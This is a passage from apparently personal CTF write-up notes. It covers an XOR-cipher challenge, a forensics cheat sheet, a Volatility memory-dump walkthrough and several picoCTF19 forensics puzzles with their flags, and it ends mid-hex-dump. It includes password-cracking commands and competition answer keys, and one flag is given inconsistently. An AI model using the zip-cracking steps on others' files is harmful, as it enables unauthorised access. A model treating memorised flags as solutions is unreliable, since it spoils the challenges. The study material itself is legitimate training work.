</code></pre><p>Use this <a href=https://cloudconvert.com/ppm-to-pdf>converter</a><p>Looks like garbage maybe it's not the correct size... perhaps brute force necessary.<h2><a class=header href=#flag-23 id=flag-23>Flag</a></h2><p><code>UNSOLVED</code><h1><a class=header href=#auctf20-extraordinary id=auctf20-extraordinary>AUCTF20 Extraordinary</a></h1><h2><a class=header href=#problem id=problem>Problem</a></h2><p>On their way back from the market, Alice and Bob noticed a little device on the ground. Next to it was a piece of paper with what looked like a bunch of scrambled numbers on it. It looked completely random. They took it to the lost and found, but on their way they played with it a little bit (don't tell anyone!). The device was never picked up, so we get to play with it a little bit, too. Can you figure out how the device works?<p><code>b'6\x1d\x0cT*\x12\x18V\x05\x13c1R\x07u#\x021Jq\x05\x02n\x03t%1\\\x04@V7P\\\x17aN'</code><p><code>nc challenges.auctf.com 30030</code><h2><a class=header href=#solution-24 id=solution-24>Solution</a></h2><p>We are given a byte array that appears to be the hex representation of a string. However there are some illegal characters.<p>Let's connect to the service and do some investigation:<pre><code class=language-bash>$ nc challenges.auctf.com 30030
&gt; a
b''
&gt; aa
b'\x14'
&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
b'\x14\x02\x15\x07\x1a\x0fR\x17R3&gt;\x13R4\x12R&gt;\x18Q\x143&gt;Q5\x11&gt;YVS\x17\x02YXVS\x1c\x14\x02\x15\x07\x1a\x0fR\x17R3&gt;\x13R4\x12R&gt;\x18Q\x143&gt;Q5\x11&gt;YVS\x17\x02YXVS\x1c\x14\x02\x15\x07\x1a\x0fR\x17R3&gt;\x13R4\x12R&gt;\x18Q\x143&gt;Q'
&gt; b
b'\x03'
&gt; bb
b'\x03\x17'
&gt; bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
b'\x03\x17\x01\x16\x04\x19\x0cQ\x14Q0=\x10Q7\x11Q=\x1bR\x170=R6\x12=ZUP\x14\x01Z[UP\x1f\x03\x17\x01\x16\x04\x19\x0cQ\x14Q0=\x10Q7\x11Q=\x1bR\x170=R6\x12=ZUP\x14\x01Z[UP\x1f\x03\x17\x01\x16\x04\x19\x0cQ\x14Q0=\x10Q7\x11Q=\x1bR\x170=R'
&gt; c
b'\x02'
&gt; cc
b'\x02\x16'
&gt; d
b'\x05'
&gt; ddd
b'\x05\x11\x07'
&gt; dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
b'\x05\x11\x07\x10\x02\x1f\nW\x12W6;\x16W1\x17W;\x1dT\x116;T0\x14;\\SV\x12\x07\\]SV\x19\x05\x11\x07\x10\x02\x1f\nW\x12W6;\x16W1\x17W;\x1dT\x116;T0\x14;\\SV\x12\x07\\]SV\x19\x05\x11\x07\x10\x02\x1f\nW\x12W6;\x16W1\x17W;\x1dT\x116;T'
</code></pre><p>It seems that it starts off as a vignere cipher, but at some points there are weird bit shifts. Additionally it seems to repeat.
Based on two similar inputs of the same size producing a pattern of identical size which repeats.<p>In the case of:<pre><code class=language-bash>&gt; aa
b'\x14'
&gt; aaaa
b'\x14\x02\x15\x07
&gt; b
b'\x03'
&gt; bb
b'\x03\x17'
</code></pre><p>I assume the flag must be coming in the format <code>auctf{ ... }</code> so this is probably a <a href=https://en.wikipedia.org/wiki/XOR_cipher>XOR Cipher</a>.<p>Let's attempt to brute force the key, short example here:<pre><code class=language-python>#!/usr/bin/env python

c = b'\x03\x17\x01\x16\x04\x19\x0cQ\x14Q0=\x10Q7\x11Q=\x1bR\x170=R6\x12=ZUP\x14\x01Z[UP\x1f\x03\x17\
x01\x16\x04\x19\x0cQ\x14Q0=\x10Q7\x11'
keys = ['a', 'b', 'c']

for j in keys:
    flag = ''
    for i in c:
        flag += chr(int(i) ^ ord(j))
    print(flag)
</code></pre><pre><code class=language-bash>$ python test.py | grep -e &quot;auctf&quot;
auctf{n3v3R_r3Us3_y0uR_0Tp_872vc8972}auRStf{n3v3R_r3Us
</code></pre><h2><a class=header href=#flag-24 id=flag-24>Flag</a></h2><p>auctf{n3v3R_r3Us3_y0uR_0Tp_872vc8972}<h1><a class=header href=#forensics-2 id=forensics-2>Forensics</a></h1><h2><a class=header href=#unknown-file id=unknown-file>Unknown file</a></h2><pre><code class=language-bash>$ file hardshells
hardshells: Zip archive data, at least v1.0 to extract
$ mv hardshells hardshells.zip
</code></pre><h2><a class=header href=#data-file-tricks id=data-file-tricks>Data file tricks</a></h2><pre><code class=language-bash>$ file dat
dat: data
</code></pre><p>Use <code>hexedit</code> or <code>bless</code> to open.<p>If you find:<p><code>IHDR</code> or <code>IDAT</code> - are section headers for PNG. Search for png magic headers/bytes<p><code>@ICC_PROFILE</code> or <code>Adobe</code> anywhere - Search for JPEG Magic headers/bytes<h2><a class=header href=#gif id=gif>GIF</a></h2><h3><a class=header href=#split-frames-of-gif id=split-frames-of-gif>Split frames of GIF</a></h3><p><code>$ convert picasso.gif %02d.png</code><h2><a class=header href=#png id=png>PNG</a></h2><h3><a class=header href=#convert-white-pixels-into-transparent-pixels-several-files id=convert-white-pixels-into-transparent-pixels-several-files>Convert white pixels into transparent pixels (several files)</a></h3><p><code>$ ls *.png | while read filename; do convert $filename -transparent white $filename; done</code><h3><a class=header href=#stackoverlay-images-on-top-of-each-other id=stackoverlay-images-on-top-of-each-other>Stack/Overlay images on top of each other</a></h3><p><code>$ ls *.png | while read filename; do convert $filename 00.png -gravity center -composite 00.png; done</code><h2><a class=header href=#jpeg id=jpeg>JPEG</a></h2><h3><a class=header href=#placeholder id=placeholder>placeholder</a></h3><h2><a class=header href=#zip id=zip>Zip</a></h2><p><code>PK</code> - ZIP Magic File Header<h3><a class=header href=#bruteforce-zip-password id=bruteforce-zip-password>Bruteforce Zip Password</a></h3><p>Download rockyou.txt (it's a wordlist)<p><code>$ fcrackzip -v -D -u -p rockyou.txt hardshells.zip</code><h2><a class=header href=#filesystems id=filesystems>Filesystems</a></h2><pre><code class=language-bash>$ file dat
dat: Minix filesystem, V1, 30 char names, 20 zones
$ mkdir mountpoint &amp;&amp; sudo mount dat mountpoint/
</code></pre><h2><a class=header href=#pcap-packet-capture id=pcap-packet-capture>PCAP (Packet Capture)</a></h2><p><code>$ tcpflow -r thunder.pcap</code> - Will output files that go from one IP to another<p><code>$ binwalk -e thunder.pcap</code><p><code>$ foremost thunder.pcap</code><p><code>$ strings thunder.pcap | grep -r "flag"</code> - Shot in the dark<h2><a class=header href=#wireshark id=wireshark>Wireshark</a></h2><p>Given a <code>.pem</code> file, go to Settings > Preferences > Protocol > SSL
Add RSA key list with <code>.pem</code> for IP Address you need to decrypt
Enter name for SSL debug file<h2><a class=header href=#steganography-2 id=steganography-2>Steganography</a></h2><p><a href=https://0xrick.github.io/lists/stego/>https://0xrick.github.io/lists/stego/</a><h1><a class=header href=#aeroctf-2020-drawings-on-the-wall id=aeroctf-2020-drawings-on-the-wall>AeroCTF 2020 Drawings on the wall</a></h1><h2><a class=header href=#problem-1 id=problem-1>Problem</a></h2><p>My friend started having problems with his head and he began to draw some nonsense on the walls.<p>Can you make out these notes?<p><a href=https://mega.nz/#!WJ4mGaBB!tW9Ls1Zlx-LBhUiEqVfWajUqTy9UT5lJk44jYqvBx_w>Download</a><h2><a class=header href=#solution-25 id=solution-25>Solution</a></h2><p>Download the file from the link above, extract it and we're left with a file called <code>memory.dmp</code><p>Using the <code>file</code> command, let's find out what it is:<pre><code class=language-bash>$  file memory.dmp 
memory.dmp: MS Windows 64bit crash dump, full dump, 524288 pages
</code></pre><p>Seems like it's a Windows crash dump, we can use the tool <a href=https://github.com/volatilityfoundation/volatility>volatility</a> to help us analyze this dump file.<p>Let's figure out which processes were running.<pre><code class=language-bash>$ vol.py -f memory.dmp --profile=Win7SP1x64 pslist
Volatility Foundation Volatility Framework 2.6.1
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xfffffa80018c8740 System                    4      0    101      411 ------      0 2020-02-24 14:27:25 UTC+0000                                 
0xfffffa8003e077c0 smss.exe                272      4      2       30 ------      0 2020-02-24 14:27:25 UTC+0000                                 
0xfffffa8003407b30 csrss.exe               364    340     10      547      0      0 2020-02-24 14:27:27 UTC+0000                                 
0xfffffa80036217e0 wininit.exe             408    340      3       73      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa8003da1420 csrss.exe               428    416     11      307      1      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa8003054700 services.exe            472    408     11      225      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa800402e7c0 lsass.exe               496    408      7      715      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa800404db30 lsm.exe                 512    408     10      157      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa800406eb30 winlogon.exe            520    416      4      124      1      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa80040fd3c0 svchost.exe             636    472     12      365      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa8004117b30 vmacthlp.exe            696    472      3       55      0      0 2020-02-24 14:27:28 UTC+0000                                 
0xfffffa800412bb30 svchost.exe             740    472     14      314      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa8004155b30 svchost.exe             788    472     17      490      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa8004181420 svchost.exe             884    472     18      410      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa800418b3a0 svchost.exe             908    472     46     1016      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa8004211890 svchost.exe             376    472     15      613      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa800427f5f0 svchost.exe             940    472     16      512      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa80042d2910 spoolsv.exe            1128    472     13      289      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa80042d9b30 svchost.exe            1164    472     21      348      0      0 2020-02-24 14:27:29 UTC+0000                                 
0xfffffa800435ab30 taskhost.exe           1276    472      8      190      1      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa8004392b30 dwm.exe                1360    884      5      148      1      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa80043a5b30 explorer.exe           1392   1332     29      871      1      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa80043ffb30 svchost.exe            1460    472     15      217      0      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa80044a7b30 VGAuthService.         1556    472      3       87      0      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa8004481b30 vmtoolsd.exe           1636    472     10      283      0      0 2020-02-24 14:27:30 UTC+0000                                 
0xfffffa8004572720 vmtoolsd.exe           1904   1392      8      202      1      0 2020-02-24 14:27:31 UTC+0000                                 
0xfffffa80045d8420 svchost.exe            2000    472      6       94      0      0 2020-02-24 14:27:31 UTC+0000                                 
0xfffffa800461e5b0 dllhost.exe             876    472     14      198      0      0 2020-02-24 14:27:33 UTC+0000                                 
0xfffffa80040666a0 msdtc.exe              2144    472     12      148      0      0 2020-02-24 14:27:34 UTC+0000                                 
0xfffffa80046e2b30 WmiPrvSE.exe           2360    636     10      229      0      0 2020-02-24 14:27:35 UTC+0000                                 
0xfffffa800475c750 SearchIndexer.         2452    472     14      648      0      0 2020-02-24 14:27:37 UTC+0000                                 
0xfffffa8004946060 sppsvc.exe             2692    472      5      157      0      0 2020-02-24 14:29:31 UTC+0000                                 
0xfffffa80047b43c0 svchost.exe            2640    472     14      337      0      0 2020-02-24 14:29:31 UTC+0000                                 
0xfffffa8001b625b0 firefox.exe            1240    372      0 --------      1      0 2020-02-24 14:33:58 UTC+0000   2020-02-24 14:40:30 UTC+0000  
0xfffffa8001ca8b30 notepad++.exe          2836   3764      7      130      1      0 2020-02-24 14:39:32 UTC+0000                                 
0xfffffa8001a5f060 mspaint.exe            2080   1392      7      146      1      0 2020-02-28 14:50:41 UTC+0000                                 
0xfffffa8001ca3060 svchost.exe            3644    472      7      109      0      0 2020-02-28 14:50:41 UTC+0000                                 
0xfffffa8001cbab30 mspaint.exe            2804   1392      7      132      1      0 2020-02-28 15:12:05 UTC+0000                                 
0xfffffa8001dd8b30 mspaint.exe            3416   1392      6      128      1      0 2020-02-28 15:12:07 UTC+0000                                 
0xfffffa800274d060 mspaint.exe             704   1392      6      129      1      0 2020-02-28 15:12:09 UTC+0000                                 
0xfffffa8001bfe060 mspaint.exe            2964   1392      6      130      1      0 2020-02-28 15:14:03 UTC+0000                                 
0xfffffa8002098060 mspaint.exe            2124   1392      6      129      1      0 2020-02-28 15:14:28 UTC+0000                                 
0xfffffa8001c36060 svchost.exe            3504    472      5       65      0      0 2020-02-29 01:15:26 UTC+0000                                 
0xfffffa8001df3060 LogonUI.exe             736    520      8      172      1      0 2020-02-29 01:21:06 UTC+0000  
</code></pre><p>Since this challenge mentioned drawings, let's dump all those <code>mspaint.exe</code> processes.<pre><code class=language-bash>$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 2804 -D dumpedfiles/
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  2804] to 2804.dmp
$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 2080 -D dumpedfiles/   
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  2080] to 2080.dmp
$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 3416 -D dumpedfiles/         
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  3416] to 3416.dmp
$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 704 -D dumpedfiles/    
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [   704] to 704.dmp
$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 2964 -D dumpedfiles/   
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  2964] to 2964.dmp
$ vol.py -f memory.dmp --profile=Win7SP1x64  memdump -p 2124 -D dumpedfiles/    
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing mspaint.exe [  2124] to 2124.dmp
</code></pre><p>Rename all these files from <code>*.dmp</code> to <code>*.data</code> so we can open it in GIMP.<p><img src=ctf/forensics/assets/aeroctf2020-2124.png alt=aeroctf2020-2124.png title=2124>
<img src=ctf/forensics/assets/aeroctf2020-2804.png alt=aeroctf2020-2804.png title=2804>
<img src=ctf/forensics/assets/aeroctf2020-2964.png alt=aeroctf2020-2964.png title=2964>
<img src=ctf/forensics/assets/aeroctf2020-3416.png alt=aeroctf2020-3416.png title=3416>
<img src=ctf/forensics/assets/aeroctf2020-704.png alt=aeroctf2020-704.png title=704><h2><a class=header href=#flag-25 id=flag-25>Flag</a></h2><p><code>Aero{g00dj0b_y0u_f1n411y_g07_7h3_wh0l3_fl4g}</code><h1><a class=header href=#picoctf19-garden id=picoctf19-garden>PicoCTF19 Garden</a></h1><h2><a class=header href=#challenge-24 id=challenge-24>Challenge</a></h2><p>This <a href=https://2019shell1.picoctf.com/static/3e1f573c9b18e87b6764ec3a36868b5a/garden.jpg>garden</a> contains more than it seems. You can also find the file in /problems/glory-of-the-garden_0_25ece79ae00914856938a4b19d0e31af on the shell server.<p><img src=ctf/forensics/assets/garden.jpg alt=garden.jpg title=Garden.jpg><h2><a class=header href=#hints-22 id=hints-22>Hints</a></h2><p>What is a hex editor?<h2><a class=header href=#solution-26 id=solution-26>Solution</a></h2><p>Open up a hex editor and search for pico...<pre><code class=language-bash>$ strings garden.jpg | grep -a pico
Here is a flag &quot;picoCTF{more_than_m33ts_the_3y30cAf8c6B}&quot;
</code></pre><p>Also works<h2><a class=header href=#flag-26 id=flag-26>Flag</a></h2><p><code>picoCTF{more_than_m33ts_the_3y3f089EdF0}</code><h1><a class=header href=#picoctf19-unzip id=picoctf19-unzip>PicoCTF19 Unzip</a></h1><h2><a class=header href=#challenge-25 id=challenge-25>Challenge</a></h2><p>Can you unzip this <a href=https://2019shell1.picoctf.com/static/37762a7e5774d7d6c1bc79e8e1758ef9/flag.zip>file</a> and get the flag?<p><img src=ctf/forensics/assets/flag.png alt=flag.png title=Flag.png><h2><a class=header href=#hints-23 id=hints-23>Hints</a></h2><p>put the flag in the format picoCTF{XXXXX}<h2><a class=header href=#solution-27 id=solution-27>Solution</a></h2><p>Unzip the file... This isn't a real problem<h2><a class=header href=#flag-27 id=flag-27>Flag</a></h2><p><code>picoCTF{unz1pp1ng_1s_3a5y}</code><h1><a class=header href=#picoctf19-so-meta id=picoctf19-so-meta>PicoCTF19 So Meta</a></h1><h2><a class=header href=#challenge-26 id=challenge-26>Challenge</a></h2><p>Find the flag in this <a href=https://2019shell1.picoctf.com/static/051b66965016a24bb62e5af66b28cbc0/pico_img.png>picture</a>. You can also find the file in /problems/so-meta_2_da856426d694a4f0637bf1b169d8524e.<p><img src=ctf/forensics/assets/pico_img.png alt=pico_img.png title=pico_img.png><h2><a class=header href=#hints-24 id=hints-24>Hints</a></h2><p>What does meta mean in the context of files?<p>Ever hear of metadata?<h2><a class=header href=#solution-28 id=solution-28>Solution</a></h2><p>Open up the file in a hex editor...<pre><code class=language-bash>$ strings pico_img.png | grep -a pico
picoCTF{s0_m3ta_3d6ced35}
</code></pre><h2><a class=header href=#flag-28 id=flag-28>Flag</a></h2><p><code>picoCTF{s0_m3ta_3d6ced35}</code><h1><a class=header href=#picoctf19-lies-within id=picoctf19-lies-within>PicoCTF19 Lies Within</a></h1><h2><a class=header href=#challenge-27 id=challenge-27>Challenge</a></h2><p>Theres something in the <a href=https://2019shell1.picoctf.com/static/aec3861fc4d5bce4d39dc0db196426de/buildings.png>building</a>. Can you retrieve the flag?<p><img src=ctf/forensics/assets/buildings.png alt=buildings.png title=buildings.png><h2><a class=header href=#hints-25 id=hints-25>Hints</a></h2><p>There is data encoded somewhere, there might be an online decoder<h2><a class=header href=#solution-29 id=solution-29>Solution</a></h2><p>Opened up in hexedit, checked for <code>pico</code> -> no results<pre><code class=language-bash>$ strings buildings.png | grep -a pico
</code></pre><p>Used this online tool: <a href=https://stylesuxx.github.io/steganography/>https://stylesuxx.github.io/steganography/</a><h2><a class=header href=#flag-29 id=flag-29>Flag</a></h2><p><code>picoCTF{h1d1ng_1n_th3_b1t5}</code><h1><a class=header href=#picoctf19-extensions id=picoctf19-extensions>PicoCTF19 Extensions</a></h1><h2><a class=header href=#challenge-28 id=challenge-28>Challenge</a></h2><p>This is a really weird text file <a href=https://2019shell1.picoctf.com/static/45886ed4b6d5d1dc74c4944fcf4b4041/flag.txt>TXT</a>? Can you find the flag?<h2><a class=header href=#hints-26 id=hints-26>Hints</a></h2><p>How do operating systems know what kind of file it is? (It's not just the ending!<p>Make sure to submit the flag as picoCTF{XXXXX}<h2><a class=header href=#solution-30 id=solution-30>Solution</a></h2><pre><code class=language-bash>$ file flag.txt
flag.txt: PNG image data, 1697 x 608, 8-bit/color RGB, non-interlaced
$ cp flag.txt flag_extensions.png
</code></pre><p>Open the file and see the flag.<h2><a class=header href=#flag-30 id=flag-30>Flag</a></h2><p><code>picoCTF{now_you_know_about_extensions}</code><h1><a class=header href=#picoctf19-shark-wire id=picoctf19-shark-wire>PicoCTF19 Shark Wire</a></h1><h2><a class=header href=#challenge-29 id=challenge-29>Challenge</a></h2><p>We found this packet <a href=https://2019shell1.picoctf.com/static/ae9ca8cff43ed638ed5d137f9ece7455/capture.pcap>capture</a>. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.<h2><a class=header href=#hints-27 id=hints-27>Hints</a></h2><p>Try using a tool like Wireshark.<p>What are streams?<h2><a class=header href=#solution-31 id=solution-31>Solution</a></h2><p><code>Analyze > Follow UDP Stream</code><p>Amazingly, it was Stream #6<h2><a class=header href=#flag-31 id=flag-31>Flag</a></h2><p><code>picoCTF{StaT31355_636f6e6e}</code><h2><a class=header href=#helpful-tools id=helpful-tools>Helpful tools</a></h2><p><a href=https://networksecuritytools.com/list-wireshark-display-filters/>https://networksecuritytools.com/list-wireshark-display-filters/</a><h2><a class=header href=#other-solution id=other-solution>Other solution</a></h2><pre><code class=language-python>#!/usr/bin/env python
from scapy.all import *
&quot;&quot;&quot;
We found this packet capture. Recover the flag. 
You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.
&quot;&quot;&quot;
a = rdpcap('capture.pcap')
flag = []
for i in a[UDP]:
    try:
        if i[IP].src == '10.0.0.2' and i[IP].dst == '10.0.0.12':
            flag.append((i[Raw].load).decode())
    except IndexError:
        continue
print(&quot;&quot;.join(flag))
</code></pre><h1><a class=header href=#picoctf19-whitepages id=picoctf19-whitepages>PicoCTF19 WhitePages</a></h1><h2><a class=header href=#challenge-30 id=challenge-30>Challenge</a></h2><p>I stopped using YellowPages and moved onto WhitePages... but <a href=https://2019shell1.picoctf.com/static/e134178261c6fa36e9058d5408118dd9/whitepages.txt>the page they gave me</a> is all blank!<h2><a class=header href=#hints-28 id=hints-28>Hints</a></h2><p>None<h2><a class=header href=#solution-32 id=solution-32>Solution</a></h2><pre><code class=language-bash>$ file whitepages.txt
whitepages.txt: UTF-8 Unicode text, with very long lines, with no line terminators
$ du -sh *
4.0K    whitepages.txt
</code></pre><p>Opening with notepad makes it seem empty, so try a <a href=https://hex-works.com/eng>hex editor</a>.<p>Seeing repeating patterns of <code>E2 80 83</code> and <code>20</code><pre><code class=language-python>s = 'E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 20 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 20 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 20 E2 80 83 E2 80 83 E2 80 83 E2 80 83 E2 80 83 20 20 E2 80 83 20 E2 80 83 E2 80 83 20 E2 80 83 20 20 E2 80 83 E2 80 83 E2 80 83 20 20 E2 